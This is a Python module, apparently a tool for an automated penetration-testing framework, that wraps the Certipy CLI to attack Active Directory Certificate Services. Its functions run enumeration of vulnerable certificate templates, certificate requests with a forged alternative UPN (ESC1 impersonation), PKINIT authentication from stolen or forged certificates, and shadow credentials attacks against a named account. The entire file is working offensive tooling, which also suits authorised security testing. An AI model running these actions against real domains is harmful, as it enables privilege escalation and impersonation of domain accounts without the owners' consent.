"""
AD CS Abuse — enumerate and exploit Active Directory Certificate Services.

Wraps the Certipy CLI (certipy-ad) to provide AD CS enumeration (ESC1-ESC15),
certificate requests, PKINIT authentication, and shadow credentials attacks.
"""

import asyncio
import logging
import shutil
from typing import Any

from impacket.examples import logger as impacket_logger

logging.getLogger("impacket").setLevel(logging.ERROR)
logging.getLogger("certipy").setLevel(logging.ERROR)
impacket_logger.init(ts=False, debug=False)

_VALID_ACTIONS = {"find", "req", "auth", "shadow"}


async def ad_certipy(
    action: str,
    target: str,
    username: str = "",
    password: str = "",
    domain: str = "",
    dc_ip: str = "",
    ca: str = "",
    template: str = "",
    alt_name: str = "",
    cert_path: str = "",
    account: str = "",
) -> dict:
    """Enumerate and exploit AD CS via Certipy.

    Args:
        action:    Certipy subcommand — ``"find"``, ``"req"``, ``"auth"``, or ``"shadow"``.
        target:    Target IP or hostname.
        username:  Username for authentication.
        password:  Password for authentication.
        domain:    AD domain name.
        dc_ip:     Domain controller IP.
        ca:        CA name (for ``req`` action).
        template:  Certificate template name (for ``req`` action).
        alt_name:  Alternative UPN/SAN (for ``req`` action — ESC1).
        cert_path: Path to .pfx file (for ``auth`` action).
        account:   Target account (for ``shadow`` action).

    Returns:
        A dict with action, target, executed, output, and error fields.
    """
    result: dict[str, Any] = {
        "action": action,
        "target": target,
        "executed": False,
        "output": "",
        "error": None,
    }

    if action not in _VALID_ACTIONS:
        result["error"] = (
            f"Unsupported action: '{action}'. "
            f"Must be one of: {', '.join(sorted(_VALID_ACTIONS))}."
        )
        return result

    certipy_bin = shutil.which("certipy")
    if not certipy_bin:
        result["error"] = "certipy CLI not found in PATH."
        return result

    cmd: list[str] = [certipy_bin]

    user_spec = f"{username}@{domain}" if domain and username else username
    has_creds = bool(username and password)

    if action == "find":
        cmd.append("find")
        if has_creds:
            cmd.extend(["-u", user_spec, "-p", password])
        cmd.extend(["-target", target])
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])

    elif action == "req":
        if not ca:
            result["error"] = "CA name is required for 'req' action."
            return result
        cmd.append("req")
        if has_creds:
            cmd.extend(["-u", user_spec, "-p", password])
        cmd.extend(["-target", target])
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])
        cmd.extend(["-ca", ca])
        if template:
            cmd.extend(["-template", template])
        if alt_name:
            cmd.extend(["-upn", alt_name])

    elif action == "auth":
        if not cert_path:
            result["error"] = "cert_path is required for 'auth' action."
            return result
        cmd.append("auth")
        cmd.extend(["-pfx", cert_path])
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])
        if account:
            cmd.extend(["-username", account])

    elif action == "shadow":
        if not account:
            result["error"] = "account is required for 'shadow' action."
            return result
        cmd.extend(["shadow", "auth"])
        if has_creds:
            cmd.extend(["-u", user_spec, "-p", password])
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])
        cmd.extend(["-account", account])

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout_bytes, stderr_bytes = await proc.communicate()

        output = stdout_bytes.decode("utf-8", errors="replace")
        stderr = stderr_bytes.decode("utf-8", errors="replace")

        result["output"] = output.strip()
        result["executed"] = proc.returncode == 0

        if proc.returncode != 0 and stderr:
            result["error"] = stderr.strip() or f"Exit code: {proc.returncode}"

    except Exception as exc:
        result["error"] = str(exc)

    return result
